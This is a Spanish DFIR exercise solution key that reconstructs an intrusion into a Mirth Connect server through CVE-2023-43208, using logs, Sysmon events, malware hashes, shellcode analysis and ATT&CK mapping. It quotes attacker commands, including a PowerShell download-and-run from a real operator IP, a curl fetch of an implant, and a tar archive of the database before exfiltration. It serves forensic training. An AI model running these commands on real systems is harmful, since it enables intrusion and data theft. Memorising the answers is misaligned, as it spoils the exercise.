---
tags:
  - DFIR/Simulacion
  - DFIR/Windows
  - DFIR/Malware
  - DFIR/ThreatIntel
---

# Solución — Escenario 04: El servidor que nadie toca

Todas las horas están en UTC. Los comandos suponen que has descomprimido el triage en `triage/INT01/` y que tienes los EVTX convertidos a JSON con `EvtxECmd --json` o `evtx_dump -o jsonl`. Cada respuesta indica la fuente y el filtro que la demuestra.

## Qué es real y qué es inventado

- **Real:** la IP del operador `104.234.26.225` (puertos `8090/tcp`, descargas y telemetría, y `8084/tcp`, stager), el formato del `access.log` y las líneas del propio operador, las de la primera víctima del log (con IP y host sustituidos), los hashes y metadatos de `OneDrive.exe`, `client64.exe` y el DLL embebido, el texto de `run.ps1` y `run2.ps1` (**bug incluido**), la clave XOR, el shellcode, el saludo `w64` y el XOR `0x99` de la fase 3.
- **Inventado:** Kelbrook, `int01` y todo su entorno, el acceso inicial por Mirth, la post-explotación (reconocimiento, persistencia, exfiltración), el bucket de OSS (`kb7f3-hk-sync-0926.oss-cn-hongkong.aliyuncs.com`, que resuelve a `203.0.113.180`) y el aviso del CERT.
- **Dos manipulaciones deliberadas del material:**
  - El shellcode que llevan los scripts es el real con **una instrucción sustituida por `int3`** (offset `0x475`, la lectura del PEB). Se analiza igual que el original, pero no puede resolver ninguna API ni ejecutarse. La fase 3 del PCAP es un buffer ficticio, cifrado con XOR `0x99`, que descifrado empieza por `KELBROOK-04 FASE3 FICTICIA`.
  - **La única línea inventada del `access.log` es la descarga de `client64.exe` desde `192.0.2.25`** (04/10 19:18:30, `curl/7.55.1`). En el log real **ninguna víctima descarga el implante**: solo lo hacen crawlers e investigadores. Las otras 13 líneas de `192.0.2.25` son las reales de la primera víctima. Ver la pregunta 18.
- El 12/10 es festivo en España: Ardeal no envía ese día. Es la clase de detalle que distingue el ruido legítimo del ataque.

## Línea temporal

| UTC | Evento | Fuente |
| --- | --- | --- |
| 04/10 18:52:05 | Huella de versión: `GET /api/server/version` con `X-Requested-With: OpenAPI` desde `104.234.26.225` | `fw01` (`TMP-soporte-mirth`), `mirth.log` |
| 18:52:47.550 | `POST /api/users` (XML) y, a las 18:52:48.000, `cmd.exe /c whoami` hijo de `mcservice.exe` | `fw01`, `mirth.log` (18:52:48,35), Sysmon 1 / 4688 |
| 18:53:40.126 | `run.ps1` (1.ª vez). Baliza `ping?h=PS-INT01-INT01$`; `csc.exe` falla; el proceso termina | `access.log`, Sysmon 1/3/5, 4104 |
| 18:57:43.738 | Comprobación manual: `iwr .../ping?h=INT01` | `access.log` (UA de PowerShell), Sysmon 1/3 |
| 18:57:55.972 | `run.ps1` (2.ª vez), mismo fallo | Ídem |
| 18:59:18.886 | `run2.ps1`: `start-lang-FullLanguage` y `addtype-err-InvalidOperationException` (19.830) | `access.log`, 4104 |
| 18:59:24.740 | `OneDrive.exe` descargado con `Net.WebClient.DownloadFile` y ejecutado | Sysmon 1/3/11/29, `access.log` |
| 18:59:25.291 → 26.578 | `exe-start`, `dec-ok-1388`, `alloc-28377088`, `thread-1284` | `access.log`, Sysmon 3 de `OneDrive.exe` |
| 18:59:26.697 | `OneDrive.exe` → `104.234.26.225:8084`: 40 bytes enviados, 8 431 616 recibidos | `fw01`, PCAP, Sysmon 3 |
| 18:59:30 | Segunda sesión al `:8084` (la del implante en memoria) hasta las 19:43 | `fw01` |
| 19:01:30 | `winpty.dll` y `winpty-agent.exe` extraídos a `C:\Windows\Temp\winpty-0.4.3-a1f37c2e`; shell interactiva | Sysmon 11/29/1 |
| 19:02 → 19:13 | Reconocimiento (ver pregunta 12) | Sysmon 1, 4688 |
| 19:18:30 | `curl.exe` descarga `client64.exe` como `OneSyncHost.exe` (**línea inventada**) | `access.log`, Sysmon 1/3/11/29 |
| 19:19:05 | `OneSyncHost.exe install`: servicio «OneDrive Sync Host» | System 7045, Security 4697, Sysmon 13, `SYSTEM` |
| 19:19:20 | Arranca el servicio. Consulta el bucket cada 60 s durante una hora | Sysmon 1/22/3, `fw01` |
| 19:27:40 → 19:33:10 | `tar -czf C:\Windows\Temp\mc.tgz "…\appdata\mirthdb"` | Sysmon 1 / 11 |
| 19:36:17 | `OneSyncHost.exe` sube 233 975 779 bytes al bucket en 46,5 s | `fw01`, Sysmon 3/22 |
| 19:42:00 | `del C:\Windows\Temp\mc.tgz` | Sysmon 26 |
| 19:43 | Se cierra la shell. `OneDrive.exe` sigue vivo | Sysmon 5 de `winpty-agent.exe` y `cmd.exe` |
| 13/10 08:31 | `adm.jtorres` reinicia `int01` por RDP; mueren `OneDrive.exe` y sus padres; `OneSyncHost` arranca solo (08:33:15) | System 1074, Sysmon 1 |
| 16/10 08:36–08:37 | El CERT copia el directorio | `access.log` |
| 19/10 07:10 | Aviso del CERT. A las 11:19:58 IT lanza `kape.exe` | correo, Sysmon 1 |

## Respuestas

**1. Quién, cómo y cuándo.** `104.234.26.225` explotó **Mirth Connect 4.4.0** en `8443/tcp` con **CVE-2023-43208** (RCE sin autenticación por deserialización XML con XStream, parche en 4.4.1). Antes, a las **18:52:05**, preguntó la versión con `GET /api/server/version` y la cabecera `X-Requested-With: OpenAPI`; el exploit llega a las **18:52:47.550** como `POST /api/users`.
- `fw01`: `awk -F, '$5=="104.234.26.225" && $8==8443' red/fw01*.log` → 7 conexiones, la regla `TMP-soporte-mirth` (abierta desde marzo a cualquier origen). Seis de ellas lanzan un comando, una por cada `cmd.exe`.
- `mirth.log`: excepción `ConversionException` de XStream en `XmlMessageBodyReader` a las 18:52:48,35 («Unable to deserialize request body (POST /api/users)»). La excepción aparece *después* de que la orden se haya lanzado.
- Sysmon 1: `cmd.exe /c whoami` con `ParentImage` `C:\Program Files\Mirth Connect\mcservice.exe` a las 18:52:48.000.

**2. Cuenta.** `NT AUTHORITY\SYSTEM`: Mirth corre como servicio con LocalSystem (Sysmon 1, campo `User`). Por eso `$env:USERNAME` vale `INT01$` y la baliza del script es `ping?h=PS-INT01-INT01$` (`PS-<COMPUTERNAME>-<USERNAME>`). Un usuario interactivo daría `PS-<HOST>-<usuario>`. El `$` final es el rasgo de «cuenta de equipo / servicio».

**3. `run.ps1`: dos veces, y por qué falla.** Dos ejecuciones, a las 18:53:40 y 18:57:55 (Sysmon 1 de `powershell.exe` con `DownloadString('http://104.234.26.225:8090/run.ps1')`; cada una con su Sysmon 5, porque el script no tiene bucle final).
- Las P/Invoke de `VirtualAlloc`/`CreateThread` van dentro de un *here-string* `@" … "@` y se escriben `[DllImport(""kernel32"")]`. En un here-string las comillas dobles son literales, así que el compilador de C# recibe `""kernel32""` y falla con `CS1003`/`CS1026`. `Add-Type` lanza `InvalidOperationException` («Cannot add type. Compilation errors occurred», `COMPILER_ERRORS`).
- `run.ps1` lleva `$ErrorActionPreference='SilentlyContinue'`: el error se traga. La baliza `h=` está antes de `Add-Type`, por eso llega.
- Se ve en Sysmon 1 (un `csc.exe` hijo de `powershell.exe` por intento, **sin `cvtres.exe`**), Sysmon 11/26 (`.0.cs`, `.cmdline`, `.out`, `.err` en `C:\Windows\Temp`, creados y borrados, sin `.dll`) y 4104 (texto completo con las comillas dobles). No hay evento 4100.

**4. `run2.ps1`.** Envía `ping?m=addtype-err-InvalidOperationException` a las **18:59:19.829725**. El operador abandona los scripts y pide `OneDrive.exe` a las **18:59:24.740456**: **4,91 s después** (5,85 s desde que pidió `run2.ps1`).
- `run2.ps1` captura el error con `try/catch` (por eso no hay 4100) y se queda en un bucle `Start-Sleep 3600`: su `powershell.exe` no tiene Sysmon 5 hasta el reinicio.

**5. `OneDrive.exe`.** `OriginalFileName` **`ldr_win3.exe`**, sin empresa ni descripción, `FileVersion` `0.0.0.0`. SHA-256 `ad07d54b62359749b7a32c265e19e5f36cd4962cf957ea6c0fb07ceddb702230`, MD5 `215336e9270941186ac2bca89425e49b`, IMPHASH `f34d5f2d4577ed6d9ceec516c1f5a744`.
- Sysmon 1: `jq 'select(.EventID==1 and (.Image|endswith("OneDrive.exe")))'`. Cuelga de `powershell.exe`, vive en `C:\ProgramData\Microsoft\OneDrive\` (no es la ruta de OneDrive de Microsoft, que va por usuario) y no está firmado. El nombre de recurso `ldr_win3.exe` delata que es un *loader*. Es un binario .NET de 9,5 KB: carga `mscoree.dll`/`clr.dll` (Sysmon 7).
- Amcache: `FileId` `0000` + SHA-1 `9a199096b7ed2f23166296e2fde5f8dcdf8dee51`, `LinkDate` 1970 (timestamp PE a cero).

**6. El blob.** Base64 → **XOR con clave de 32 bytes repetida** `9C9066C118BC1C5BEC80CECD029248DCE0626814CF4D89FBD86AB1354AAEE54A` → **1388 bytes** (el valor de `dec-ok-1388`). En CyberChef: *From Base64* → *XOR* (clave hex, `Standard`). Los 4104 de `run.ps1`/`run2.ps1` contienen el blob completo.
- **Nota sobre el parche `int3`:** el resultado es el shellcode real con los 9 bytes de `mov rax, gs:[0x60]` (offset `0x475`) sustituidos por `0xCC`. El resto del análisis es idéntico al original.

**7. Destino y resolución de APIs.** El shellcode conecta a **`104.234.26.225:8084`** (`0x1F94` en el `sockaddr`). Envía un saludo de **40 bytes**: `w64   ` (arquitectura), `1f 94` (puerto) y el host en trozos de 4 caracteres (`104.`, `234.`, `26.2`, `25\0\0`). Se ve en el PCAP (`tcp.port==8084 && tcp.len==40`) y en `fw01` (40 bytes enviados).
- Resuelve las APIs **por hash ROR13** (rutina `block_api` de Metasploit): recorre el PEB → `InMemoryOrderModuleList` → tablas de exportación y compara `ror13(nombre)` con constantes, por ejemplo `0x0726774C` (`LoadLibraryA`), `0x006B8029` (`WSAStartup`), `0xE0DF0FEA` (`WSASocketA`), `0x6174A599` (`connect`), `0x5F38EBC2` (`send`), `0x5FC8D902` (`recv`), `0xE553A458` (`VirtualAlloc`) y `0xE449F330` (`Sleep`). Ninguna cadena de API aparece en claro.
- Recibe la fase 3 en un buffer RWX de 30 MB.

**8. Clave de la fase 3.** **XOR de un byte, `0x99`** (el shellcode lleva `80 34 39 99`, `xor byte [rcx+rdi],0x99`). En Wireshark: *Follow TCP stream* de la sesión → exportar los bytes del servidor → `python3 -c "import sys;d=open('f3.bin','rb').read();print(bytes(b^0x99 for b in d[:40]))"` → `KELBROOK-04 FASE3 FICTICIA`. En el original sería el implante en memoria; aquí es un buffer ficticio sin código. Su tamaño (8 431 616 B) coincide con `fw01`.

**9. Kill switch.** `%TEMP%\log_de.log`. Bajo `SYSTEM` es **`C:\Windows\Temp\log_de.log`**: si existe, el shellcode no continúa. Sirve para vacunar equipos, aunque es una medida frágil.

**10. Shell interactiva: winpty.** A las 19:01:30 `OneDrive.exe` extrae `winpty.dll` y `winpty-agent.exe` (versión 0.4.3, componentes legítimos de código abierto) a `C:\Windows\Temp\winpty-0.4.3-a1f37c2e` (Sysmon 11 y 29, sin firma ni metadatos). Después: `OneDrive.exe` → `winpty-agent.exe` → `cmd.exe` → `whoami`, `ipconfig`, `tar`, `curl`…; hay un `conhost.exe` por medio. Winpty emula un terminal en Windows para que el operador pueda usar una shell «de verdad».

**11. Persistencia.** Servicio **`OneSyncHost`** (nombre para mostrar «OneDrive Sync Host»).
- System **7045** a las 19:19:05.6: `ImagePath` `C:\ProgramData\Microsoft\OneDrive\Sync\OneSyncHost.exe`, inicio automático, cuenta `LocalSystem`. Security **4697** equivalente.
- `SYSTEM` hive: `ControlSet001\Services\OneSyncHost` (LastWrite 19:19:05), `Start` = 2, `ObjectName` = LocalSystem, y `FailureActions` con **reinicio del servicio a los 60 s, tres veces, y restablecimiento del contador a 86 400 s**. `regipy`: `regipy-plugins-run … -p services` o `RECmd`. Los cuatro primeros bytes de `FailureActions` son `80 51 01 00` (86400).
- El binario es `client64.exe` (Go con cgo ofuscado con garble, SHA-256 `1b6ffac83b04b5772b0b733020f2d66b2b2b9f1a462b4bb179342282a2dbca0f`, sin recurso de versión, GUI). Sysmon 1: `OneSyncHost.exe install` (padre `cmd.exe`, 19:19:05) y, a las 19:19:20, el servicio con padre `services.exe`.
- Tras el reinicio del 13/10 vuelve a arrancar solo (08:33:15, padre `services.exe`): la persistencia funciona.

**12. Datos, destino, proceso y volumen.** Se llevó la base de datos de mensajes de Mirth (resultados de analíticas, datos de salud):
- Sysmon 1 (19:27:40): `tar -czf C:\Windows\Temp\mc.tgz "C:\Program Files\Mirth Connect\appdata\mirthdb"`, hijo de `cmd.exe`, hijo de `winpty-agent.exe`. Sysmon 11 crea `mc.tgz`; ocupa **231 201 363 bytes**; termina a las 19:33:10.
- A las **19:36:17**, `OneSyncHost.exe` (PID 3852) sube al bucket `kb7f3-hk-sync-0926.oss-cn-hongkong.aliyuncs.com` (`203.0.113.180:443`): `fw01` registra **233 975 779 bytes enviados** (= tamaño × 1,012 por la sobrecarga de TLS) en 46,5 s. Es, de largo, la sesión más grande de las 209 que `fw01` registra hacia esa IP.
- **No hay `curl` ni línea de comandos de subida**: el implante lleva el SDK de OSS. Se demuestra cruzando tres fuentes: Sysmon 22 (resolución del bucket por `OneSyncHost.exe`), Sysmon 3 (PID 3852 → `203.0.113.180:443`) y `fw01` (volumen). Filtro: `awk -F, '$7=="203.0.113.180" {print $1,$10,$11}' red/fw01*.log | sort -k2 -n | tail`.
- Un segundo y medio antes (19:36:15.9) hay una consulta al bucket con una respuesta mayor de lo normal (≈1,1–1,5 KB frente a ≈0,4–0,6 KB): es la que recoge la tarea que dejó el operador.
- 19:42:00: `del C:\Windows\Temp\mc.tgz` (Sysmon 26 con la shell como proceso). `del` es una orden interna de `cmd.exe`: no crea proceso, solo deja el 26.
- El resto de consultas al bucket: cada 60 s durante la primera hora (19:20:20 → 20:19) y después cada 4 h ±10 %. Tras el reinicio del 13/10 se repite el ciclo.

**Reconocimiento (referencia para la línea temporal).** Desde la shell de `winpty-agent.exe`: `whoami /all` (19:02:11), `hostname` (19:02:40), `ipconfig /all` (19:03:22), `systeminfo` (19:04:35), `quser` (19:06:02), `tasklist /v` (19:06:51), `netstat -ano` (19:08:20), `net group "Domain Admins" /domain` (19:10:44, con `net1.exe` hijo) y `nltest /dclist:kelbrook` (19:12:31). Buscaba quién es, dónde está, qué corre y quién administra el dominio. `dir "C:\Program Files\Mirth Connect\appdata"` (hacia las 19:14) **no se ve**: `dir` es interna de `cmd.exe`. Solo se infiere por lo que viene después.

**13. Operador frente a automatismos.** Las líneas de `192.0.2.25` (Kelbrook) son las únicas con manos en el teclado:
- **Contexto SYSTEM/servicio:** `ping?h=PS-INT01-INT01$` (`HOST$`) frente a usuarios genéricos en el resto (`…-Administrator`, `…-azure`, cadenas al azar).
- **Pruebas manuales con UA de PowerShell:** `ping?h=INT01` con `WindowsPowerShell/5.1.17763.6054` (un `iwr`) y **reintentos a ritmo humano** (4 min 4 s entre el primer `run.ps1` y la comprobación; 12 s hasta el segundo intento).
- **Progresión:** `run.ps1` ×2 → `run2.ps1` (con telemetría) → `OneDrive.exe` 6 s después.
- Las demás ejecuciones: **ráfagas** de la cadena `exe-start` → `dec-ok` → `alloc` → `thread` en el mismo segundo y desde **IPs de nube consecutivas** (por ejemplo `64.233.172.76/77/78` el 15/10 a las 13:40:30), valores de `alloc-`/`thread-` distintos, nombres de host aleatorios, y una ejecución con el `h=` **sin evaluar** (`$env:COMPUTERNAME` literal en la URL): un emulador, no un sistema real. Todas aparecen **a partir del 05/10**, después de que crawlers indexaran el directorio (la primera: `138.68.145.117` pidiendo `/OneDrive.exe`, `/run.ps1` y `/run2.ps1` en un segundo, el 05/10 07:36).
- No hay manera de saber por el log solo quiénes son; basta con que no son humanos en el teclado ni víctimas. Este material no las llama «víctimas».

**14. Sin Prefetch.** Windows Server no activa Prefetch por defecto: la carpeta `C/Windows/Prefetch` del triage está vacía. La ejecución se demuestra con:
- **Amcache** (`InventoryApplicationFile`): `onedrive.exe|…` y `onesynchost.exe|…` con `FileId` = `0000` + SHA-1 reales.
- **Sysmon 1/29**, **4688 con línea de comandos**, **ShimCache** (`AppCompatCache` del `SYSTEM`, que se persiste en el apagado y por eso recoge los dos ejecutables hasta el reinicio del 13/10), y **7045**.

**15. RGPD.** Los resultados de analíticas son **datos de salud** (art. 9). Hay una brecha de confidencialidad con exfiltración confirmada: **sí hay que notificar a la AEPD (art. 33), en 72 h desde que Kelbrook tiene constancia de la brecha**: desde el aviso del CERT del **19/10 a las 09:10** o desde que IT lo confirma con las evidencias, **no desde el 04/10**. Por el alto riesgo para los afectados es probable que también deba comunicarse a los interesados (art. 34), sin dilaciones indebidas. Además, documentar el incidente (art. 33.5) y avisar a Ardeal como responsable/encargado según el contrato.

**16. Lo que falta.** El triage no recoge `$MFT`, `$UsnJrnl:$J`, SRUM, la memoria ni las bases de Mirth. No se puede responder con certeza qué contenía `mc.tgz` (se borró y no queda copia), qué ejecutó la fase 3 en memoria ni qué más consultó (la fase 3 nunca toca disco y `OneDrive.exe` murió el 13/10: **ni una captura de memoria habría servido ya**). Habría recogido: `$MFT`+`$J` (aparición y borrado de `mc.tgz`), SRUM (bytes por proceso y aplicación), la base `mirthdb` y los logs de Jetty de Mirth, DNS de `dc01`/`dns01`, el binario `OneSyncHost.exe` (para analizarlo y extraer su configuración de OSS) y una captura de memoria *antes* del reinicio. Con eso se sabría exactamente qué mensajes había en `mirthdb` en esa fecha.

**17. Parches.** La versión `5.1.17763.6054` es la de Windows PowerShell en **Windows Server 2019 / Windows 10 1809 con el acumulativo de julio de 2024** (revisión `.6054`; a confirmar contra el historial de actualizaciones de Microsoft para 17763). En Server 2019 la revisión de PowerShell sube con cada parche acumulativo, así que un `.6054` en octubre de 2026 indica **más de dos años sin parchear**. Se corrobora con `UBR` = 6054 en `SOFTWARE\Microsoft\Windows NT\CurrentVersion`, con la ausencia de eventos de `WindowsUpdateClient` en System, con la clave `WUServer` de WSUS apuntando a un servidor que ya no responde (`SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate`) y con que el único reinicio de la ventana es manual. El Mirth sin parchear (4.4.0, con 4.4.1 disponible desde octubre de 2023) es de la misma familia.

**18. La línea inventada.** `2026-10-04T19:18:30.5… | GET | 192.0.2.25 /client64.exe | UA=curl/7.55.1`. Se sabe porque es la única de `192.0.2.25` que no está en la copia original del log (ver la sección «Qué es real y qué es inventado»): en el log real ninguna víctima descarga el implante. El UA `curl/7.55.1` es el del `curl.exe` incluido en Server 2019 y concuerda con el Sysmon 1 de `curl.exe` hijo de `cmd.exe`; la conexión (Sysmon 3, `fw01`) precede a la línea en menos de un segundo, igual que las demás.

**19. El reinicio del 13/10.** A las **08:31:00** `adm.jtorres` (Sysmon 1 de `shutdown.exe /r` y System **1074**, motivo «Aplicación: mantenimiento (planeado)», comentario «Canal ADT_Ardeal colgado, reinicio de int01») reinicia el equipo por RDP; `int01` vuelve a las 08:33. Mueren `OneDrive.exe` y toda la cadena de procesos del ataque **sin Sysmon 5** (el apagado no lo registra) y `OneSyncHost` arranca solo (08:33:15, padre `services.exe`). Es actividad legítima de IT que, sin saberlo, borra la evidencia de memoria.

## Notas para el que corrige

- El material tiene **ruido de fondo** real: 6 semanas de MLLP de Ardeal en días laborables (sin el 12/10), escaneos al `8443` todos los días, RDP de `adm.jtorres` los martes, el mantenimiento de la VM del 15/09 y las actualizaciones de firmas de Defender. Por eso el ataque no salta con un solo filtro.
- **Defender no detecta nada:** las muestras eran nuevas, el shellcode va cifrado, el C# de `Add-Type` no llega a compilar y la fase 3 nunca toca disco. Hay además una exclusión de `C:\Program Files\Mirth Connect\` en `SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths`, creada por el integrador, que es un hallazgo de configuración. **Hoy esas muestras sí estarían detectadas.**
- La fase 3 que llega por `:8084` se **supone** el mismo implante del DLL embebido en `client64.exe` convertido a shellcode: es una inferencia del análisis estático.
- El C2 del implante persistente no se pudo extraer (las cadenas están cifradas por garble). El bucket de OSS es inventado para no atribuir a infraestructura real nada que no se haya observado.

## Mapa ATT&CK

| Fase | Técnica | Evidencia |
| --- | --- | --- |
| Reconocimiento | T1595.002 | `GET /api/server/version`, `fw01` |
| Acceso inicial | T1190 | CVE-2023-43208, `mirth.log`, hijos de `mcservice.exe` |
| Ejecución | T1059.001, T1059.003, T1106 | 4104, Sysmon 1, `VirtualAlloc`/`CreateThread` |
| Evasión | T1036.005, T1027.002, T1027.013, T1620, T1070.004 | `OneDrive.exe`, `OneSyncHost`, blob XOR, fase 3 en memoria, `del mc.tgz` |
| Transferencia | T1105 | `run*.ps1`, `OneDrive.exe`, `client64.exe` |
| Persistencia | T1543.003 | 7045, `Services\OneSyncHost` |
| Descubrimiento | T1033, T1082, T1016, T1049, T1057, T1069.002, T1018, T1083 | `whoami`, `systeminfo`, `ipconfig`, `netstat`, `tasklist`, `net group`, `nltest` |
| Recolección | T1005, T1560.001 | `tar.exe` sobre `mirthdb` |
| C2 | T1071.001, T1095 | `:8090` HTTP, `:8084` TCP en bruto |
| Exfiltración | T1567.002 | Alibaba Cloud OSS |
